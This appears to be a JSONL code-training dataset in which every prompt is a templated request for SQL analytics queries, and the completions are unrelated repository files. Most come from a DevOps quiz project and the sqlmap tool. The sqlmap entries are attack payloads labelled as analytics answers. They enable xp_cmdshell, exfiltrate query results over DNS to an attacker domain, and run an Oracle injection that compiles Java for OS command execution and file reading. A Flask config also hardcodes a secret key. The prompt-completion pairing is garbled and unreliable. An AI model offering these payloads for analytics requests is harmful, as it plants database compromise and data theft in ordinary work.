{"domain": "data_engineering", "category": "sql_analytics", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate function-based implementation for Create SQL query for data analytics and reporting with SQL analytics queries\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "import random\nimport optparse\nimport os\n\n\ndef main():\n    \"\"\"Reads through README.md for question/answer pairs and adds them to a\n    list to randomly select from and quiz yourself.\n    Supports skipping questions with no documented answer with the -s flag\n    \"\"\"\n    parser = optparse.OptionParser()\n    parser.add_option(\"-s\", \"--skip\", action=\"store_true\",\n                      help=\"skips questions without an answer.\",\n                      default=False)\n    options, args = parser.parse_args()\n\n    with open('README.md', 'r') as f:\n        text = f.read()\n\n    questions = []\n\n    while True:\n        question_start = text.find('<summary>') + 9\n        question_end = text.find('</summary>')\n        answer_end = text.find('</b></details>')\n\n        if answer_end == -1:\n            break\n\n        question = text[question_start: question_end].replace('<br>', '').replace('<b>', '')\n        answer = text[question_end + 17: answer_end]\n        questions.append((question, answer))\n        text = text[answer_end + 1:]\n\n    num_questions = len(questions)\n\n    while True:\n        try:\n            question, answer = questions[random.randint(0, num_questions)]\n\n            if options.skip and not answer.strip():\n                continue\n            os.system(\"clear\")\n            print(question)\n            print(\"...Press Enter to show answer...\")\n            input()\n            print('A: ', answer)\n            print(\"... Press Enter to continue, Ctrl-C to exit\")\n            input()\n\n        except KeyboardInterrupt:\n            break\n\n    print(\"\\nGoodbye! See you next time.\")\n\n\nif __name__ == '__main__':\n    main()\n", "metadata": {"source": "github.com/bregman-arie/devops-exercises", "file_path": "scripts/random_question.py", "language": "python", "complexity": "simple", "star_count": 77731, "quality_score": 0.9500000000000001, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "sql_analytics", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate module integration for Create SQL query for data analytics and reporting\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "\"\"\"\nMeant to be used like this:\n\npython scripts/update_question_number.py\n\n\"\"\"\nimport pathlib\nfrom scripts.question_utils import get_question_list, get_challenges_count\n\nLINE_FLAG = b\":bar_chart:\"\n\np = pathlib.Path(__file__).parent.parent.joinpath('README.md')\n\n\nwith open(p, 'rb') as f:\n    file = f.readlines()\n\n\nfile_list = [line.rstrip() for line in file]\n\nquestion_list = get_question_list(file_list)\nquestion_count = len(question_list)\ntotal_count = question_count + get_challenges_count()\nprint(question_count)\nprint(get_challenges_count())\nprint(total_count)\nfor line in file:\n    if LINE_FLAG in line:\n        file[file.index(line)] = b':bar_chart: &nbsp;There are currently **%s** questions\\r\\n' %\\\n                                 str(total_count).encode()\n        break\n\nwith open(p, 'wb') as f:\n    f.writelines(file)\n", "metadata": {"source": "github.com/bregman-arie/devops-exercises", "file_path": "scripts/update_question_number.py", "language": "python", "complexity": "simple", "star_count": 77731, "quality_score": 0.89, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "sql_analytics", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate class-based implementation for Create SQL query for data analytics and reporting\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "import unittest\nfrom pathlib import Path\nfrom typing import List\nfrom scripts.question_utils import get_answered_questions, get_question_list\n\n\ndef open_test_case_file(n: int) -> List[bytes]:\n    tests_path = Path(__file__).parent.joinpath()\n\n    with open(f'{tests_path}/testcases/testcase{n}.md', 'rb') as f:\n        file_list = [line.rstrip() for line in f.readlines()]\n    return file_list\n\n\nclass QuestionCount(unittest.TestCase):\n\n    def test_case_1(self):\n        raw_list = open_test_case_file(1)\n        question_list = get_question_list(raw_list)\n        answers = get_answered_questions(question_list)\n\n        self.assertEqual(len(question_list), 11)\n        self.assertEqual(len(answers), 3)\n\n    def test_case_2(self):\n        raw_list = open_test_case_file(2)\n        question_list = get_question_list(raw_list)\n        answers = get_answered_questions(question_list)\n\n        self.assertEqual(len(question_list), 16)\n        self.assertEqual(len(answers), 11)\n", "metadata": {"source": "github.com/bregman-arie/devops-exercises", "file_path": "tests/scripts_question_utils_unittest.py", "language": "python", "complexity": "simple", "star_count": 77731, "quality_score": 0.98, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "sql_analytics", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate class-based implementation for Create SQL query for data analytics and reporting\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "\"\"\"\nWIP\n\nYes, we do write tests for our tests.\n\"\"\"\nfrom pathlib import Path\nfrom typing import List\nfrom unittest import TestCase\nfrom tests import syntax_lint\n\n\ndef open_test_case_file(n: int) -> List[bytes]:\n    tests_path = Path(__file__).parent.joinpath()\n\n    with open(f'{tests_path}/testcases/testcase{n}.md', 'rb') as f:\n        file_list = [line.rstrip() for line in f.readlines()]\n    return file_list\n\n\ntest_case_1 = open_test_case_file(1)\ntest_case_2 = open_test_case_file(2)\ntest_case_3 = open_test_case_file(3)\n\n\nclass TestSyntax(TestCase):\n\n    def test_details_count_case1(self):\n        self.assertTrue(syntax_lint.count_details(test_case_1))\n\n    def test_details_count_case2(self):\n        self.assertTrue(syntax_lint.count_details(test_case_2))\n\n    def test_details_errors_1(self):\n        syntax_lint.check_details_tag(test_case_1)\n        self.assertFalse(syntax_lint.errors)\n\n    def test_details_errors_2(self):\n        syntax_lint.check_details_tag(test_case_2)\n        self.assertFalse(syntax_lint.errors)\n    #\n    # def test_details_error_exist_1(self):\n    #     syntax_checker.check_details_tag(test_case_3)\n    #     print(syntax_checker.errors)\n    #     self.assertEqual(len(syntax_checker.errors), 3)\n", "metadata": {"source": "github.com/bregman-arie/devops-exercises", "file_path": "tests/syntax_checker_unittest.py", "language": "python", "complexity": "simple", "star_count": 77731, "quality_score": 1.0, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "sql_analytics", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate function-based implementation for Create SQL query for data analytics and reporting\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "\"\"\"\nTesting suite for https://github.com/bregman-arie/devops-interview-questions\nwritten by surister\n\nEven though both check_details_tag and check_summary_tags are practically the\nsame, due to readability and functionality it was decided to be split like\nthat.\n\nUsage:\n$ python tests/syntax_lint.py\n\n\"\"\"\n\nimport sys\n\np = sys.argv[1]\n\n\nerrors = []\n\n\ndef count_details(file_list):\n    \"\"\"\n    Counts the total amount of <details> and </details>\n\n    Used for debugging purpose, not meant to be used in actual tests\n    \"\"\"\n    details_final_count = 0\n    details_count = 0\n\n    for line_number, line in enumerate(file_list):\n        if b\"<details>\" in line:\n            details_count += 1\n        if b\"</details>\" in line:\n            details_final_count += 1\n\n    return details_count == details_final_count\n\n\ndef count_summary(file_list):\n    \"\"\"\n    Counts the total amount of <details> and </details>\n\n    Used for debugging purpose, not meant to be used in actual tests\n    \"\"\"\n    details_final_count = 0\n    details_count = 0\n\n    for line_number, line in enumerate(file_list):\n        if b\"<summary>\" in line:\n            details_count += 1\n        if b\"</summary>\" in line:\n            details_final_count += 1\n\n    return details_count == details_final_count\n\n\ndef check_details_tag(file_list):\n    \"\"\"\n    Check whether the structure:\n    <details>\n    ...\n    </details>\n\n    Is correctly followed, if not generates an error.\n\n    \"\"\"\n\n    after_detail = False\n    error = False\n    err_message = \"\"\n    for line_number, line in enumerate(file_list):\n        if b\"<details>\" in line and b\"</details>\" in line:\n            pass\n        else:\n            if b\"<details>\" in line and after_detail:\n                err_message = f\"Missing closing detail tag round line {line_number - 1}\"\n                error = True\n            if b\"</details>\" in line and not after_detail:\n                err_message = f\"Missing opening detail tag round line {line_number - 1}\"\n                error = True\n\n            if b\"<details>\" in line:\n                after_detail = True\n\n            if b\"</details>\" in line and after_detail:\n                after_detail = False\n\n            if error:\n                errors.append(err_message)\n\n        error = False\n\n\ndef check_summary_tag(file_list):\n    \"\"\"\n    Check whether the structure:\n    <summary>\n    ...\n    </summary>\n\n    Is correctly followed, if not generates an error.\n\n    \"\"\"\n\n    after_summary = False\n    error = False\n    err_message = \"\"\n    for idx, line in enumerate(file_list):\n        line_number = idx + 1\n        if b\"<summary>\" in line and b\"</summary>\" in line:\n            if after_summary:\n                err_message = f\"Missing closing summary tag around line {line_number}\"\n                error = True\n\n        else:\n            if b\"<summary>\" in line and after_summary:\n                err_message = f\"Missing closing summary tag around line {line_number}\"\n                error = True\n            if b\"</summary>\" in line and not after_summary:\n                err_message = f\"Missing opening summary tag around line {line_number}\"\n                error = True\n\n            if b\"<summary>\" in line:\n                after_summary = True\n\n            if b\"</summary>\" in line and after_summary:\n                after_summary = False\n\n        if error:\n            errors.append(err_message)\n\n        error = False\n\n\ndef check_md_file(file_name):\n    with open(p, \"rb\") as f:\n        file_list = [line.rstrip() for line in f.readlines()]\n    check_details_tag(file_list)\n    check_summary_tag(file_list)\n\n\nif __name__ == \"__main__\":\n    print(f\"..........Checking {p}..........\")\n    check_md_file(p)\n    if errors:\n        print(f\"{p} failed\", file=sys.stderr)\n        for error in errors:\n            print(error, file=sys.stderr)\n        exit(1)\n\n    print(\"Tests passed successfully.\")\n", "metadata": {"source": "github.com/bregman-arie/devops-exercises", "file_path": "tests/syntax_lint.py", "language": "python", "complexity": "medium", "star_count": 77731, "quality_score": 0.89, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "sql_analytics", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate configuration for Create SQL query for data analytics and reporting with SQL analytics queries\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "---\napiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: hello-blue-whale\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: hello-world-app\n      version: blue\n  template:\n    metadata:\n      name: hello-blue-whale-pod\n      labels:\n        app: hello-world-app\n        version: blue\n    spec:\n      containers:\n      - name: hello-whale-container\n        image: abregman2/helloworld:latest\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 80\n        - containerPort: 443\n---\napiVersion: v1\nkind: Service\nmetadata:\n  name: hello-world\n  labels:\n    app: hello-world-app\nspec:\n  ports:\n  - port: 80\n    targetPort: 80\n    protocol: TCP\n    name: http\n  selector:\n    app: hello-world-app\n---\napiVersion: networking.k8s.io/v1\nkind: Ingress\nmetadata:\n  name: example-ingress\n  annotations:\n      cert-manager.io/cluster-issuer: selfsigned-issuer\n      nginx.ingress.kubernetes.io/rewrite-target: /\n      kubernetes.io/ingress.class: nginx\nspec:\n  tls:\n  - hosts:\n      - hello-world.app\n    secretName: shhh\n  rules:\n    - host: hello-world.app\n      http:\n        paths:\n          - path: /\n            pathType: Prefix\n            backend:\n              service:\n                name: hello-world\n                port:\n                  number: 80\n", "metadata": {"source": "github.com/bregman-arie/devops-exercises", "file_path": "topics/cicd/solutions/deploy_to_kubernetes/helloworld.yml", "language": "yaml", "complexity": "simple", "star_count": 77731, "quality_score": 0.8, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "sql_analytics", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate module integration for Create SQL query for data analytics and reporting\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "#!/usr/bin/env python\n# coding=utf-8\n\nimport os\n\nbasedir = os.path.abspath(os.path.dirname(__file__))\n\nSECRET_KEY = 'shhh'\nCSRF_ENABLED = True\n\nSQLALCHEMY_DATABASE_URI = 'sqlite:///' + os.path.join(basedir, 'app.db')\n", "metadata": {"source": "github.com/bregman-arie/devops-exercises", "file_path": "topics/flask_container_ci/app/config.py", "language": "python", "complexity": "simple", "star_count": 77731, "quality_score": 0.8300000000000001, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "sql_analytics", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate function-based implementation for Create SQL query for data analytics and reporting\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "#!/usr/bin/env python\n# coding=utf-8\n\nfrom flask import Flask\nfrom flask import make_response\n\nimport json\nfrom flask_wtf.csrf import CSRFProtect\nfrom werkzeug.exceptions import NotFound\n\n# OpenRefactory Warning: The 'Flask' method creates a Flask app\n# without Cross-Site Request Forgery (CSRF) protection.\napp = Flask(__name__)\nCSRFProtect(app)\n\nwith open(\"./users.json\", \"r\") as f:\n    users = json.load(f)\n\n\n@app.route(\"/\", methods=['GET'])\ndef index():\n    return pretty_json({\n        \"resources\": {\n            \"users\": \"/users\",\n            \"user\": \"/users/<username>\",\n        },\n        \"current_uri\": \"/\"\n    })\n\n\n@app.route(\"/users\", methods=['GET'])\ndef all_users():\n    return pretty_json(users)\n\n\n@app.route(\"/users/<username>\", methods=['GET'])\ndef user_data(username):\n    if username not in users:\n        raise NotFound\n\n    return pretty_json(users[username])\n\n\n@app.route(\"/users/<username>/something\", methods=['GET'])\ndef user_something(username):\n    raise NotImplementedError()\n\n\ndef pretty_json(arg):\n    response = make_response(json.dumps(arg, sort_keys=True, indent=4))\n    response.headers['Content-type'] = \"application/json\"\n    return response\n\n\ndef create_test_app():\n    # OpenRefactory Warning: The 'Flask' method creates a Flask app\n    # without Cross-Site Request Forgery (CSRF) protection.\n    app = Flask(__name__)\n    CSRFProtect(app)\n    return app\n\n\nif __name__ == \"__main__\":\n    app.run(port=5000)\n", "metadata": {"source": "github.com/bregman-arie/devops-exercises", "file_path": "topics/flask_container_ci/app/main.py", "language": "python", "complexity": "simple", "star_count": 77731, "quality_score": 0.92, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "sql_analytics", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate class-based implementation for Create SQL query for data analytics and reporting\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "#!/usr/bin/env python\n# coding=utf-8\n\nimport os\nimport unittest\n\nfrom config import basedir\nfrom app import app\nfrom app import db\n\n\nclass TestCase(unittest.TestCase):\n\n    def setUp(self):\n        app.config['TESTING'] = True\n        app.config['WTF_CSRF_ENABLED'] = False\n        app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///' + os.path.join(\n            basedir, 'test.db')\n        self.app = app.test_client()\n        db.create_all()\n\n    def tearDown(self):\n        db.session.remove()\n        db.drop_all()\n\n\nif __name__ == '__main__':\n    unittest.main()\n", "metadata": {"source": "github.com/bregman-arie/devops-exercises", "file_path": "topics/flask_container_ci/app/tests.py", "language": "python", "complexity": "simple", "star_count": 77731, "quality_score": 0.98, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "sql_analytics", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate class-based implementation for Create SQL query for data analytics and reporting\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "#!/usr/bin/env python\n# coding=utf-8\n\nimport unittest\n\nfrom app import main\n\n\nclass TestCase(unittest.TestCase):\n\n    def setUp(self):\n        self.app = main.app.test_client()\n\n    def test_main_page(self):\n        response = self.app.get('/', follow_redirects=True)\n        self.assertEqual(response.status_code, 200)\n\n    def test_users_page(self):\n        response = self.app.get('/users', follow_redirects=True)\n        self.assertEqual(response.status_code, 200)\n\n\nif __name__ == '__main__':\n    unittest.main()\n", "metadata": {"source": "github.com/bregman-arie/devops-exercises", "file_path": "topics/flask_container_ci/tests.py", "language": "python", "complexity": "simple", "star_count": 77731, "quality_score": 0.98, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "sql_analytics", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate module integration for Create SQL query for data analytics and reporting\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "#!/usr/bin/env python\n# coding=utf-8\n\nimport os\n\nbasedir = os.path.abspath(os.path.dirname(__file__))\n\nSECRET_KEY = 'shhh'\nCSRF_ENABLED = True\n\nSQLALCHEMY_DATABASE_URI = 'sqlite:///' + os.path.join(basedir, 'app.db')\n", "metadata": {"source": "github.com/bregman-arie/devops-exercises", "file_path": "topics/flask_container_ci2/app/config.py", "language": "python", "complexity": "simple", "star_count": 77731, "quality_score": 0.8300000000000001, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "sql_analytics", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate configuration for Create SQL query for data analytics and reporting\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# These are supported funding model platforms\n\n# github: [fighting41love]# Replace with up to 4 GitHub Sponsors-enabled usernames e.g., [user1, user2]\n# patreon: # Replace with a single Patreon username\n# open_collective: # Replace with a single Open Collective username\n# ko_fi: # Replace with a single Ko-fi username\n# tidelift: # Replace with a single Tidelift platform-name/package-name e.g., npm/babel\n# community_bridge: # Replace with a single Community Bridge project-name e.g., cloud-foundry\n# liberapay: # Replace with a single Liberapay username\n# issuehunt: # Replace with a single IssueHunt username\n# otechie: # Replace with a single Otechie username\ncustom: ['https://github.com/fighting41love/funNLP/blob/master/data/.logo图片/.捐赠图片/donation.md', 'paypal.me/yangyangfuture']\n", "metadata": {"source": "github.com/fighting41love/funNLP", "file_path": ".github/FUNDING.yml", "language": "yaml", "complexity": "simple", "star_count": 75031, "quality_score": 0.8, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "sql_analytics", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate module integration for Create SQL query for data analytics and reporting\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "on:\n  push:\n    branches: [ master ]\n  pull_request:\n    branches: [ master ]\n\njobs:\n  build:\n    runs-on: ${{ matrix.os }}\n    strategy:\n      matrix:\n        os: [ubuntu-latest, macos-latest, windows-latest]\n        python-version: [ 'pypy-2.7', '3.13' ]\n        exclude:\n          - os: macos-latest\n            python-version: 'pypy-2.7'\n    steps:\n      - uses: actions/checkout@v2\n      - name: Set up Python\n        uses: actions/setup-python@v2\n        with:\n          python-version: ${{ matrix.python-version }}\n      - name: Basic import test\n        run: python -c \"import sqlmap; import sqlmapapi\"\n      - name: Smoke test\n        run: python sqlmap.py --smoke\n      - name: Vuln test\n        run: python sqlmap.py --vuln\n", "metadata": {"source": "github.com/sqlmapproject/sqlmap", "file_path": ".github/workflows/tests.yml", "language": "yaml", "complexity": "simple", "star_count": 34859, "quality_score": 0.8300000000000001, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "sql_analytics", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate configuration for Create SQL query for data analytics and reporting\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "EXEC master..sp_configure 'show advanced options',1;\nRECONFIGURE WITH OVERRIDE;\nEXEC master..sp_configure 'ole automation procedures',1;\nRECONFIGURE WITH OVERRIDE\n", "metadata": {"source": "github.com/sqlmapproject/sqlmap", "file_path": "data/procs/mssqlserver/activate_sp_oacreate.sql", "language": "sql", "complexity": "simple", "star_count": 34859, "quality_score": 0.6300000000000001, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "sql_analytics", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate configuration for Create SQL query for data analytics and reporting\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "EXEC master..sp_configure 'show advanced options', 1;\nRECONFIGURE WITH OVERRIDE;\nEXEC master..sp_configure 'Ad Hoc Distributed Queries', %ENABLE%;\nRECONFIGURE WITH OVERRIDE;\nEXEC sp_configure 'show advanced options', 0;\nRECONFIGURE WITH OVERRIDE\n", "metadata": {"source": "github.com/sqlmapproject/sqlmap", "file_path": "data/procs/mssqlserver/configure_openrowset.sql", "language": "sql", "complexity": "simple", "star_count": 34859, "quality_score": 0.6300000000000001, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "sql_analytics", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate configuration for Create SQL query for data analytics and reporting\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "EXEC master..sp_configure 'show advanced options',1;\nRECONFIGURE WITH OVERRIDE;\nEXEC master..sp_configure 'xp_cmdshell',%ENABLE%;\nRECONFIGURE WITH OVERRIDE;\nEXEC master..sp_configure 'show advanced options',0;\nRECONFIGURE WITH OVERRIDE\n", "metadata": {"source": "github.com/sqlmapproject/sqlmap", "file_path": "data/procs/mssqlserver/configure_xp_cmdshell.sql", "language": "sql", "complexity": "simple", "star_count": 34859, "quality_score": 0.6300000000000001, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "sql_analytics", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate configuration for Create SQL query for data analytics and reporting with SQL analytics queries\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "DECLARE @host varchar(1024);\nSELECT @host='%PREFIX%.'+(%QUERY%)+'.%SUFFIX%.%DOMAIN%';\nEXEC('master..xp_dirtree \"\\\\'+@host+'\\%RANDSTR1%\"')\n# or EXEC('master..xp_fileexist \"\\\\'+@host+'\\%RANDSTR1%\"')\n", "metadata": {"source": "github.com/sqlmapproject/sqlmap", "file_path": "data/procs/mssqlserver/dns_request.sql", "language": "sql", "complexity": "simple", "star_count": 34859, "quality_score": 0.6000000000000001, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "sql_analytics", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate configuration for Create SQL query for data analytics and reporting with SQL analytics queries\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "SELECT * FROM OPENROWSET('SQLOLEDB','';'%USER%';'%PASSWORD%','SET FMTONLY OFF %STATEMENT%')\n# SELECT * FROM OPENROWSET('SQLNCLI', 'server=(local);trusted_connection=yes','SET FMTONLY OFF SELECT 1;%STATEMENT%')\n# SELECT * FROM OPENROWSET('SQLOLEDB','Network=DBMSSOCN;Address=;uid=%USER%;pwd=%PASSWORD%','SET FMTONLY OFF %STATEMENT%')\n", "metadata": {"source": "github.com/sqlmapproject/sqlmap", "file_path": "data/procs/mssqlserver/run_statement_as_user.sql", "language": "sql", "complexity": "simple", "star_count": 34859, "quality_score": 0.6000000000000001, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "sql_analytics", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate configuration for Create SQL query for data analytics and reporting with SQL analytics queries\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "SELECT LOAD_FILE(CONCAT('\\\\\\\\%PREFIX%.',(%QUERY%),'.%SUFFIX%.%DOMAIN%\\\\%RANDSTR1%'))\n", "metadata": {"source": "github.com/sqlmapproject/sqlmap", "file_path": "data/procs/mysql/dns_request.sql", "language": "sql", "complexity": "simple", "star_count": 34859, "quality_score": 0.6000000000000001, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "sql_analytics", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate configuration for Create SQL query for data analytics and reporting with SQL analytics queries\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "SELECT UTL_INADDR.GET_HOST_ADDRESS('%PREFIX%.'||(%QUERY%)||'.%SUFFIX%.%DOMAIN%') FROM DUAL\n# or SELECT UTL_HTTP.REQUEST('http://%PREFIX%.'||(%QUERY%)||'.%SUFFIX%.%DOMAIN%') FROM DUAL\n# or (CVE-2014-6577) SELECT EXTRACTVALUE(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM \"http://%PREFIX%.'||(%QUERY%)||'.%SUFFIX%.%DOMAIN%/\"> %remote;]>'),'/l') FROM dual \n", "metadata": {"source": "github.com/sqlmapproject/sqlmap", "file_path": "data/procs/oracle/dns_request.sql", "language": "sql", "complexity": "simple", "star_count": 34859, "quality_score": 0.6000000000000001, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "sql_analytics", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate class-based implementation for Create SQL query for data analytics and reporting with SQL analytics queries\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "SELECT SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('%RANDSTR1%','%RANDSTR2%','DBMS_OUTPUT\".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''create or replace and compile java source named \"OsUtil\" as import java.io.*; public class OsUtil extends Object {public static String runCMD(String args) {try{BufferedReader myReader= new BufferedReader(new InputStreamReader( Runtime.getRuntime().exec(args).getInputStream() ) ); String stemp,str=\"\";while ((stemp = myReader.readLine()) != null) str +=stemp+\"\\n\";myReader.close();return str;} catch (Exception e){return e.toString();}}public static String readFile(String filename){try{BufferedReader myReader= new BufferedReader(new FileReader(filename)); String stemp,str=\"\";while ((stemp = myReader.readLine()) != null) str +=stemp+\"\\n\";myReader.close();return str;} catch (Exception e){return e.toString();}}}'''';END;'';END;--','SYS',0,'1',0) FROM DUAL\nSELECT SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('%RANDSTR1%','%RANDSTR2%','DBMS_OUTPUT\".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''begin dbms_java.grant_permission( ''''''''PUBLIC'''''''', ''''''''SYS:java.io.FilePermission'''''''', ''''''''<>'''''''', ''''''''execute'''''''' );end;'''';END;'';END;--','SYS',0,'1',0) FROM DUAL\nSELECT SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('%RANDSTR1%','%RANDSTR2%','DBMS_OUTPUT\".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''create or replace function OSREADFILE(filename in varchar2) return varchar2 as language java name ''''''''OsUtil.readFile(java.lang.String) return String''''''''; '''';END;'';END;--','SYS',0,'1',0) FROM DUAL\nSELECT SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('%RANDSTR1%','%RANDSTR2%','DBMS_OUTPUT\".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''grant all on OSREADFILE to public'''';END;'';END;--','SYS',0,'1',0) FROM DUAL\n", "metadata": {"source": "github.com/sqlmapproject/sqlmap", "file_path": "data/procs/oracle/read_file_export_extension.sql", "language": "sql", "complexity": "simple", "star_count": 34859, "quality_score": 0.69, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "sql_analytics", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate configuration for Create SQL query for data analytics and reporting with SQL analytics queries\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "DROP TABLE IF EXISTS %RANDSTR1%;\n# https://wiki.postgresql.org/wiki/CREATE_OR_REPLACE_LANGUAGE <- if \"CREATE LANGUAGE plpgsql\" is required\nCREATE TABLE %RANDSTR1%(%RANDSTR2% text);\nCREATE OR REPLACE FUNCTION %RANDSTR3%()\nRETURNS VOID AS $$\nDECLARE %RANDSTR4% TEXT;\nDECLARE %RANDSTR5% TEXT;\nBEGIN\nSELECT INTO %RANDSTR5% (%QUERY%);\n%RANDSTR4% := E'COPY %RANDSTR1%(%RANDSTR2%) FROM E\\'\\\\\\\\\\\\\\\\%PREFIX%.'||%RANDSTR5%||E'.%SUFFIX%.%DOMAIN%\\\\\\\\%RANDSTR6%\\'';\nEXECUTE %RANDSTR4%;\nEND;\n$$ LANGUAGE plpgsql SECURITY DEFINER;\nSELECT %RANDSTR3%();", "metadata": {"source": "github.com/sqlmapproject/sqlmap", "file_path": "data/procs/postgresql/dns_request.sql", "language": "sql", "complexity": "simple", "star_count": 34859, "quality_score": 0.8, "authority_level": "high", "authentic": true}}
